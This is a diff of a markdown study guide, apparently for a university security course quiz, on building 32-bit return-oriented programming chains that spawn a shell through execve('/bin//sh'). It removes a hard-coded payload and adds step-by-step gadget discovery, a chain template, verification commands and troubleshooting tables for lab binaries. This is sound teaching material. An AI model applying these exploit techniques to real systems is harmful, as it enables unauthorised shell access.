@@ -220,55 +220,166 @@ echo 'id' | ./scripts/run.sh ./binary exploit
 
 ## 6. RETURN-ORIENTED PROGRAMMING (ROP)
 
-**Source:** [rop.c](rop.c)  
-**Compile:** `gcc -Wall -no-pie -fno-pic -m32 -fno-stack-protector rop.c -o rop`  
-**Use when:** NX is ON (stack not executable), no stack canary, ret2libc not viable (e.g. libc addresses unknown or ASLR active)
+**Use when:** NX is ON (`GNU_STACK RW`), no canary, no accessible libc (or ret2libc fails)
+**Tools:** [tools/find_gadgets.py](tools/find_gadgets.py) · [tools/solve_rop_template.py](tools/solve_rop_template.py)
 
-### Concept:
-Chain together small existing code snippets ("gadgets") that each end in `ret`.  
-Each gadget does one small operation, then returns to the next gadget.
+### Concept
+Chain together small code snippets ("gadgets") already in the binary, each ending in `ret`.
+No new code is injected. The CPU just follows the chain of return addresses on the stack.
 
-### Goal: build `execve("/bin//sh", NULL, NULL)` = syscall 0xb
-
+**Goal:** build `execve("/bin//sh", NULL, NULL)` = int 0x80 with:
 ```
-ROP chain to execve("/bin//sh", NULL, NULL):
-  eax = 0xb  (syscall number)
-  ebx = ptr to "/bin//sh"
-  ecx = 0
-  edx = 0
-  int 0x80
+eax = 0xb   ebx = ptr to "/bin//sh"   ecx = 0   edx = 0
 ```
 
-### Full working payload (from [rop.c](rop.c)):
+---
+
+### STEP 1 — Check if ROP is even needed
+
 ```bash
-./rop `printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xce\x84\x04\x08\x2f\x62\x69\x6e\x24\xa0\x04\x08\xe0\x84\x04\x08\xce\x84\x04\x08\x2f\x2f\x73\x68\x28\xa0\x04\x08\xe0\x84\x04\x08\xcf\x84\x04\x08\x24\xa0\x04\x08\xd7\x84\x04\x08\xf2\x84\x04\x08\xfb\x84\x04\x08\x04\x85\x04\x08\x0d\x85\x04\x08"`
+readelf -l ./binary | grep GNU_STACK
+# RW  = NX on → shellcode fails → try ret2libc first, then ROP
+# RWE = stack executable → use shellcode instead (simpler)
+
+objdump -d ./binary | grep "int.*0x80"
+# MUST exist for execve ROP — if missing, ret2libc is your only option
 ```
 
-### Finding gadget addresses for a new binary:
+---
+
+### STEP 2 — Detect mmap gadget-building in main() ← DO THIS BEFORE ANYTHING ELSE
+
 ```bash
-objdump -d ./binary | grep -A2 "pop.*eax"   # find pop eax; ret
-objdump -d ./binary | grep -B1 "int.*0x80"  # find syscall
-# Or use ROPgadget tool:
-ROPgadget --binary ./binary --rop
+objdump -d ./binary | sed -n '/<main>/,/<__libc_csu_init>/p' | grep -E "mmap|movb|malloc"
 ```
 
-### Chain structure (rop.c gadgets):
+**If you see `mmap` + `movb`:** the binary builds its own gadgets at runtime.
+Do NOT hunt for gadgets in the binary code — they don't exist there yet.
+Instead, decode the `movb` bytes:
+
+```bash
+objdump -d ./binary | sed -n '/<main>/,/<__libc_csu_init>/p' | grep "movb"
+# Each movb writes one byte into a heap buffer
+# Read bytes in order (+0, +1, +2...) → decode as x86 instructions
+# Common patterns: 58=pop eax, 5b=pop ebx, c3=ret, 31c0=xor eax,eax, etc.
 ```
-padding(32B)
-f1_addr   → pop eax; pop ebx; ret     ← gadget
-/bin      → value popped into eax
-writable_addr → value popped into ebx
-f3_addr   → mov eax,(ebx); ret        ← write "/bin" to memory
-f1_addr   → pop eax; pop ebx; ret
-//sh      → value popped into eax
-writable_addr+4 → ebx
-f3_addr   → mov eax,(ebx); ret        ← write "//sh" to memory
-f4_addr   → mov eax,ebx; ret          ← ebx = writable_addr
-f5_addr   → xor ecx,ecx; ret          ← ecx = 0
-f6_addr   → xor edx,edx; ret          ← edx = 0
-f7_addr   → mov $0xb,%al; ret         ← eax = 11
-f8_addr   → int $0x80; ret            ← syscall!
+
+**mmap base formula:**
+```python
+mmap_base = (hardcoded_addr // pagesize - 0x1000) * pagesize
+# pagesize = 0x1000 (4096)
+# gadget_base = mmap_base + TEMP_value  (TEMP=1000 → offset=1000=0x3e8)
 ```
+
+**Writable memory for mmap ROP:**
+```
+⚠️  NEVER use .bss when binary has mmap — init_data() may fill it with 0xffffffff
+    Always use mmap_base + 0x500 (zeroed by MAP_ANONYMOUS, safe null terminator)
+```
+
+---
+
+### STEP 3 — Find gadgets (standard binary, no mmap)
+
+**Automated (fastest):**
+```bash
+python3 ~/326_quiz3/tools/find_gadgets.py ./binary
+# Outputs: all gadget addresses + chain diagram + Python payload template
+```
+
+**Manual fallback:**
+```bash
+objdump -d ./binary | grep -A2 "58 5b c3"   # pop eax; pop ebx; ret
+objdump -d ./binary | grep -A2 "89 03 c3"   # mov [ebx],eax; ret
+objdump -d ./binary | grep -A2 "89 c3 c3"   # mov ebx,eax; ret
+objdump -d ./binary | grep -A2 "31 c0 c3"   # xor eax,eax; ret
+objdump -d ./binary | grep -A2 "31 c9 c3"   # xor ecx,ecx; ret
+objdump -d ./binary | grep -A2 "31 d2 c3"   # xor edx,edx; ret
+objdump -d ./binary | grep -A2 "b0 0b c3"   # mov al,0xb; ret
+objdump -d ./binary | grep -A2 "cd 80 c3"   # int 0x80; ret
+```
+
+**Find writable address:**
+```bash
+readelf -S ./binary | grep -E "\.bss|\.data"
+# use the address shown — pick .bss (usually zero-initialized)
+# WARNING: check init_data() doesn't poison it first (see STEP 2)
+```
+
+---
+
+### STEP 4 — Build the chain
+
+**Using the template (copy and fill in addresses):**
+```bash
+cp ~/326_quiz3/tools/solve_rop_template.py ./solve_rop_binX.py
+# Edit: set OFFSET, WR_ADDR, and all G_* gadget addresses
+python3 ./solve_rop_binX.py
+```
+
+**Chain structure (visual):**
+```
+[padding OFFSET bytes]                 ← fill buffer + saved EBP
+[G_POP_EAX_POP_EBX]  pop eax; pop ebx; ret
+[0x6e69622f]          '/bin'  → eax
+[WR_ADDR]             writable addr → ebx
+[G_MOV_EBXPTR_EAX]   mov [ebx],eax; ret  → writes '/bin' to memory
+
+[G_POP_EAX_POP_EBX]  pop eax; pop ebx; ret
+[0x68732f2f]          '//sh'  → eax
+[WR_ADDR+4]           writable+4 → ebx
+[G_MOV_EBXPTR_EAX]   mov [ebx],eax; ret  → writes '//sh' to memory
+
+[G_POP_EAX_POP_EBX]  pop eax; pop ebx; ret
+[WR_ADDR]             writable addr → eax
+[0x41414141]          dummy → ebx
+[G_MOV_EBX_EAX]      mov ebx,eax; ret    → ebx = ptr to "/bin//sh"
+
+[G_XOR_ECX_ECX]      xor ecx,ecx; ret   → ecx = 0
+[G_XOR_EDX_EDX]      xor edx,edx; ret   → edx = 0
+[G_XOR_EAX_EAX]      xor eax,eax; ret   → eax = 0
+[G_MOV_AL_0B]        mov al,0xb; ret     → eax = 11
+[G_INT_80]           int 0x80            → SYSCALL → shell!
+```
+
+---
+
+### STEP 5 — Verify
+
+```bash
+echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./binary ./exploit.X
+# → uid=9992(apieri01) ← success
+```
+
+---
+
+### Gadget byte reference card
+
+| Bytes | Instruction | Gadget name |
+|-------|-------------|-------------|
+| `58 5b c3` | pop eax; pop ebx; ret | G_POP_EAX_POP_EBX |
+| `31 c0 c3` | xor eax,eax; ret | G_XOR_EAX_EAX |
+| `89 03 c3` | mov [ebx],eax; ret | G_MOV_EBXPTR_EAX |
+| `89 c3 c3` | mov ebx,eax; ret | G_MOV_EBX_EAX |
+| `31 c9 c3` | xor ecx,ecx; ret | G_XOR_ECX_ECX |
+| `31 d2 c3` | xor edx,edx; ret | G_XOR_EDX_EDX |
+| `b0 0b c3` | mov al,0xb; ret | G_MOV_AL_0B |
+| `cd 80 c3` | int 0x80; ret | G_INT_80 |
+
+**Warning:** Different binaries in the same quiz set can have the **same gadgets in different order**.
+Always decode fresh for each binary. Never copy gadget addresses between binaries.
+
+---
+
+### Common ROP failures and fixes
+
+| Symptom | Cause | Fix |
+|---------|-------|-----|
+| Segfault, no output | Wrong offset | Re-check `lea -0xNN(%ebp)` in display_file |
+| Segfault, no output | Wrong gadget address | Re-run find_gadgets.py, verify bytes manually |
+| `execve` returns -1 | .bss not null-terminated | Use mmap_base+0x500 instead of .bss |
+| Shell spawns but crashes instantly | Gadgets in wrong order | Decode movb table fresh for this binary |
+| Nothing runs | `int 0x80` missing | Use ret2libc instead |
 
 ---
 
